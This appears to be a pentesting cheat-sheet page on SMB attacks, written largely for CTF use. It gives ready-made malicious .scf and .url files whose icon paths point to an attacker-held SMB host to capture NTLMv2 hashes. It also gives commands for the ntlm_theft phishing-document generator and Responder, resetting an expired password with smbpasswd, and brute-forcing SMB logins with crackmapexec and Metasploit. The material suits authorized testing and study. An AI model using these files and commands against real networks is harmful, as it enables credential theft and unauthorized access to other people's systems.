# Attacks

## NTLM Theft via .SCF/.URL

{% hint style="success" %}
If we have write permissions on a shared directory and we suspect that a user frequently accesses it, we can obtain hashes.
{% endhint %}

### Theory

Windows Explorer uses a Shell Command File (SCF) to move directories up and down, display the desktop, etc. An SCF file can be manipulated so that the location of the icon file points to a specific UNC path and Windows Explorer initiates an SMB session when the folder where the .scf file resides is accessed. If we change the IconFile to an SMB server that we control and run a tool such as **Responder**, **Inveigh** or **InveighZero**, we can often capture the NTLMv2 password hashes of any user browsing the share. This can be particularly useful if we gain write access to a file share that appears to be heavily used or even a directory on a user's workstation. We may be able to capture the hash of a user's password and use the password in clear text to escalate privileges on the target host, within the domain, or expand our access/gain access to other resources.

### Practice

{% tabs %}
{% tab title="Manual" %}
We create a malicious SCF/URL file:

{% code title="@Inventory.scf" %}
```shell
[Shell]
Command=2
IconFile=\\<LHOST>\share\legit.ico
[Taskbar]
Command=ToggleDesktop
```
{% endcode %}

{% code title="@leak.url" %}
```shell
[InternetShortcut]
URL=asd
IconIndex=0
IconFile=\\<IP>\leak\leak.ico
```
{% endcode %}
{% endtab %}

{% tab title="Automatic" %}
### ntlm\_theft

ntlm\_theft is an open source Python3 tool that generates 21 different types of hash stealer documents. These can be used for phishing when the target allows smb traffic outside your network, or if it is already inside the internal network.

```bash
git clone https://github.com/Greenwolf/ntlm_theft
sudo pip3 install xlsxwriter # Dependence required.
python3 ntlm_theft.py -g all -s <TUN0/ETH0 IP> -f <FILENAME>
```
{% endtab %}
{% endtabs %}

We upload the malicious SCF/URL to a directory and start Responder.py with all the default settings (everything set to "On"):

```bash
responder -I tun0 -rdwvÂ # The Responder.conf file must be all set to On.
```

We wait and if someone enters the directory or any interaction occurs within that directory, it will dump the NTLMv2 hash.

## Change password

In CTFs, we may have the occasion where when performing a Password Spraying, we see that a user has that password but tells us that his password has expired, with the following attribute: STATUS\_PASSWORD\_MUST\_CHANGE

![](../../.gitbook/assets/STATUS\_PASSWORD\_MUST\_CHANGE.png)

In this case, we can change the password with the command `smbpasswd`.

### smbpasswd

```bash
smbpasswd -r <IP> -U "<USERNAME>"
# We will be asked for the old password, enter it and then enter a
# new strong password (letters, numbers and a symbol at the end).
```

## Brute Force

{% tabs %}
{% tab title="crackmapexec" %}
```bash
crackmapexec smb <IP> -u users.txt -p passwords.txt --continue-on-success
```
{% endtab %}

{% tab title="Metasploit" %}
```bash
use auxiliary/scanner/smb/smb_login
set RHOSTS <IP>
set USER_FILE <path/to/file>
set PASS_FILE <path/to/file>
set stop_on_success true # Optional
set THREADS 50
run
```
{% endtab %}
{% endtabs %}

